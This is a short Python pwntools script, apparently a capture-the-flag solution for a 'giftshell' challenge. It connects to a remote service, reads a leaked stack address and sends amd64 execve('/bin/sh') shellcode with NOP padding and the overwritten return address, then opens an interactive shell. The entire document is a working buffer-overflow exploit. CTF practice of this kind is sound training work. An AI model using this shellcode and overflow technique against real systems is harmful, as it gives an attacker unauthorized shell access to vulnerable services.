from pwn import *

p = remote("giftshell.securinets.tn",4010)
shellcode = asm(
"""
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  
xor rsi, rsi 
xor rdx, rdx 
mov rax, 0x3b
syscall 
""",arch='amd64')
shellcode += b'\x90'*91
input()

p.recvuntil(b'Pass this test to get to the next step. You can win a discount on one of our products! ')
hex_str =  p.recv(14)
hex_int = int(hex_str, 16)
shellcode += p64(hex_int) 

p.sendafter(b'Input: ',shellcode)
p.interactive()

